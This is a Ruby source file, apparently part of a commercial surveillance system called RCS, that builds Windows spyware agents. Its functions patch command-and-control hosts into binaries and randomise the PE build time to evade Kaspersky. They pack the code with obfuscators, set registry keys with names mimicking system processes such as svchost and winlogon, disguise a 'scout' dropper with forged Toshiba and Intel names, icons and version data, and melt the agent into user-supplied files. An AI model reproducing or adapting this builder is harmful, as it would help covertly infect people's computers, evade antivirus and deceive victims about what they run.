#
#  Agent creation for windows
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/binary'

module RCS
module DB

class BuildWindows < Build

  def initialize
    super
    @platform = 'windows'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :windows, params['demo']

    # remember the demo parameter
    @demo = params['demo']

    # invoke the generic patch method with the new params
    super

    if File.exist? path('scout')
      params[:core] = 'scout'
      params[:config] = nil
      # invoke the generic patch method with the new params
      super
      patch_file(:file => 'scout') do |content|
        begin
          host = @factory.configs.first.sync_host
          raise "Sync host not found" unless host
          content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
          # the filename of the final exec
          content.binary_patch 'SCOUT'*4, scout_name(@factory.confkey)[:name].ljust(20, "\x00")
        rescue
          raise "Sync marker not found"
        end
      end
    end

    # calculate the function name for the dropper
    @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]

    patch_file(:file => 'core') do |content|
      begin
        # patching for the function name
        marker = "Funcname"
        content.binary_patch 'PFTBBP', @funcname

        # patching the build time (for kaspersky)
        marker = "Build time"
        offset = content.index("PE\x00\x00")
        raise "offset is nil" if offset.nil?
        content.binary_patch_at_offset offset + 8, SecureRandom.random_bytes(4)

        # the new registry key
        marker = "Registry key"
        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
        # and the old one (previous method)
        core = scramble_name(@factory.seed, 3)
        dir = scramble_name(core[0..7], 7)
        reg = '*' + scramble_name(dir, 1)[1..-1]
        content.binary_patch 'IaspdPDuFMfnm_apggLLL712j', reg.ljust(25, "\x00")

      rescue
        raise "#{marker} marker not found"
      end
    end

    # we have an exception here, the core64 must be patched only with some values

    patch_file(:file => 'core64') do |content|
      begin
        # patching for the function name
        marker = "Funcname"
        content.binary_patch 'PFTBBP', @funcname

        # per-customer signature
        marker = "Signature"
        sign = ::Signature.where({scope: 'agent'}).first
        signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
        marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
        magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
        content.binary_patch marker, signature

        # the new registry key
        marker = "Registry key"
        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
      rescue
        raise "#{marker} marker not found"
      end
    end

    # code obfuscator
    CrossPlatform.exec path('packer32'), "#{path('core')}"
    CrossPlatform.exec path('packer64'), "#{path('core64')}"

    # signature for the patched code
    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core')}" if to_be_signed?(params)
    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core64')}" if to_be_signed?(params)

    # add random bytes to codec, rapi and sqlite
    CrossPlatform.exec path('packer'), "#{path('codec')}"
    add_random(path('rapi'))
    add_random(path('sqlite'))

  end

  def scramble
    trace :debug, "Build: scrambling"

    core = scramble_name(@factory.seed, 3)
    core_backup = scramble_name(core, 32)
    dir = scramble_name(core[0..7], 7)
    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
    codec = scramble_name(config, 2)
    driver = scramble_name(config, 4)
    driver64 = scramble_name(config, 16)
    core64 = scramble_name(config, 15)
    oldreg = '*' + scramble_name(dir, 1)[1..-1]
    reg = reg_start_key(@factory.confkey)

    @scrambled = {core: core, core64: core64, driver: driver, driver64: driver64,
                  dir: dir, reg: reg, oldreg: oldreg, config: config, codec: codec }

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super

  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    @appname = params['appname'] || 'agent'

    # parse the parameters
    @cooked = (params['cooked'] == true) ? true : false
    @admin = (params['admin'] == true) ? true : false
    @bit64 = (params['bit64'] == false) ? false : true
    @codec = (params['codec'] == false) ? false : true
    @scout = (params['scout'] == false) ? false : true

    # choose the correct melting mode
    melting_mode = :silent
    melting_mode = :cooked if @cooked
    melting_mode = :melted if params['input']

    # change the icon of the exec accordingly to the name
    customize_scout(@factory.confkey) if @scout

    case melting_mode
      when :silent
        silent()
      when :cooked
        # this is a build for the NI
        cook()
      when :melted
        # user-provided file to melt with
        melted(Config.instance.temp(params['input']))
    end

    File.exist? path('output') || raise("output file not created")

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs = ['output']
  end

  def sign(params)
    trace :debug, "Build: signing: #{params}"

    # don't sign cooked file (its not a valid PE)
    return if @cooked

    # perform the signature
    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}" if to_be_signed?(params)
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open(@appname + (@cooked ? '.cooked' : '.exe'), "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

  def unique(core)
    Zip::ZipFile.open(core) do |z|
      core_content = z.file.open('core', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
      core_content = z.file.open('scout', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('scout'), "wb") {|f| f.write core_content}
    end

    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
    FileUtils.rm_rf Config.instance.temp('core')
    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('scout')}"
    FileUtils.rm_rf Config.instance.temp('scout')
  end

  def ghost(params)
    trace :debug, "Build: ghost: #{params}"

    # patching for the ghost
    patch_file(:file => 'ghost') do |content|
      begin
        offset = content.index("ADDRESS1")
        raise "address1 not found" if offset.nil?
        content.binary_patch_at_offset offset, params[:sync][0]
        offset = content.index("ADDRESS2")
        raise "address2 not found" if offset.nil?
        content.binary_patch_at_offset offset, params[:sync][1]

        sign = ::Signature.where({scope: 'agent'}).first
        signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
        content.binary_patch '3j9WmmDgBqyU270FTid3719g64bP4s52', signature

        content.binary_patch "\xe1\xbe\xad\xde".force_encoding('ASCII-8BIT'), [params[:build]].pack('I').force_encoding('ASCII-8BIT')
        content.binary_patch "\xe2\xbe\xad\xde".force_encoding('ASCII-8BIT'), [params[:instance]].pack('I').force_encoding('ASCII-8BIT')
      rescue Exception => e
        trace :error, e.message
        trace :fatal, e.backtrace.join("\n")
        raise "Ghost marker not found: #{e.message}"
      end
    end
  end

  private

  def cook
    if @scout
      cook_param = '-S ' + path('scout') + ' -O ' + path('output')
    else
      key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase

      # write the ini file
      File.open(path('RCS.ini'), 'w') do |f|
        f.puts "[RCS]"
        f.puts "HUID=#{@factory.ident}"
        f.puts "HCORE=#{@scrambled[:core]}"
        f.puts "HCONF=#{@scrambled[:config]}"
        f.puts "CODEC=#{@scrambled[:codec]}" if @codec
        f.puts "DLL64=#{@scrambled[:core64]}" if @bit64

        # TODO: driver removal (just comment them here)
        #f.puts "HDRV=#{@scrambled[:driver]}"
        #f.puts "DRIVER64=#{@scrambled[:driver64]}"

        f.puts "HDIR=#{@scrambled[:dir]}"
        f.puts "HREG=#{@scrambled[:reg]}"
        f.puts "HSYS=ndisk.sys"
        f.puts "HKEY=#{key}"
        f.puts "MANIFEST=" + (@admin ? 'yes' : 'no')
        f.puts "FUNC=" + @funcname
        f.puts "INSTALLER=" + (@cooked ? 'no' : 'yes')
      end
      cook_param = '-C -R ' + path('') + ' -O ' + path('output')
      cook_param += " -d #{path('demo_image')}" if @demo
    end

    CrossPlatform.exec path('cooker'), cook_param

    File.exist? path('output') || raise("cooker output file not created")
  end

  def silent
    if @scout
      # the scout is already created
      FileUtils.cp path('scout'), path('output')
    else
      # we have to create a silent installer
      cook()
      cooked = File.open(path('output'), 'rb') {|f| f.read}

      silent_file = @admin ? 'silent_admin' : 'silent'
      File.open(path(silent_file), 'ab+') {|f| f.write cooked}

      # delete the cooked output file and overwrite it with the silent output
      FileUtils.rm_rf path('output')
      FileUtils.cp path(silent_file), path('output')
    end
  end

  def melted(input)
    FileUtils.mv input, path('input')

    if @scout
      CrossPlatform.exec path('dropper'), '-s ' + path('scout') + ' ' + path('output')
    else
      CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                          (@bit64 ? path(@scrambled[:core64]) : 'null') +' '+
                                          path(@scrambled[:config])+' '+

                                          # TODO: driver removal
                                          'null ' +
                                          'null ' +
                                          #path(@scrambled[:driver])+' '+
                                          #(@bit64 ? path(@scrambled[:driver64]) : 'null') +' '+

                                          (@codec ? path(@scrambled[:codec]) : 'null') +' '+
                                          @scrambled[:dir]+' '+
                                          (@admin ? '1' : '0') +' '+
                                          @funcname +' '+
                                          (@demo ? path('demo_image') : 'null') +' '+
                                          path('input') + ' ' +
                                          path('output')
    end
  end

  def add_random(file)
    File.open(file, 'ab+') {|f| f.write SecureRandom.random_bytes(16)}
  end

  def to_be_signed?(params)
    # default case
    do_signature = false

    # not requested but the cert is present
    if (params.nil? or not params.has_key? 'sign') and File.exist? Config.instance.cert("windows.pfx")
      do_signature = true
    end

    # explicit request to sign the code
    if not params.nil? and params['sign']
      raise "Cannot find pfx file" unless File.exist? Config.instance.cert("windows.pfx")
      do_signature = true
    end

    do_signature
  end

  def reg_start_key(seed)
    fakever = (seed[2].ord % 11).to_s + "." + seed.slice(0..2).unpack('S').first.to_s

    fake_names = ['wmiprvse', 'lssas', 'dllhost', 'winlogon', 'svchost', 'MSInst', 'WinIME',
                  'RSSFeed', 'IconDB', 'MSCache', 'IEPrefs', 'EVTvwr', 'TServer', 'SMBAuth',
                  'DRM', 'Recovery', 'Registry', 'Cookies', 'MSVault', 'MSDiag', 'MSHelp']
    fake_names[seed.ord % fake_names.size] + " " + fakever
  end

  def scout_name(seed)
    scout_names = [{name: 'btassist', version: '7.0.0.0', desc: 'Bluetooth Assistant', company: 'TOSHIBA CORPORATION', copyright: 'Copyright (C) 2009 TOSHIBA CORPORATION, All rights reserved.'},
                   {name: 'IAStorIcon', version: '10.1.0.1008', desc: 'IAStorIcon', company: 'INTEL CORPORATION', copyright: 'Copyright (c) Intel Corporation 2009-2010'},
                   {name: 'PrivacyIconClient', version: '7.1.20.1119', desc: 'Intel(R) Management and Security Status', company: 'INTEL CORPORATION', copyright: 'Copyright (c) 2007-2011 Intel Corporation'}]

    scout_names[seed.ord % scout_names.size]
  end

  def customize_scout(seed)

    info = scout_name(seed)
    icon = "icons/#{info[:name]}.ico"

    CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon)}"

    CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
  end
end

end #DB::
end #RCS::
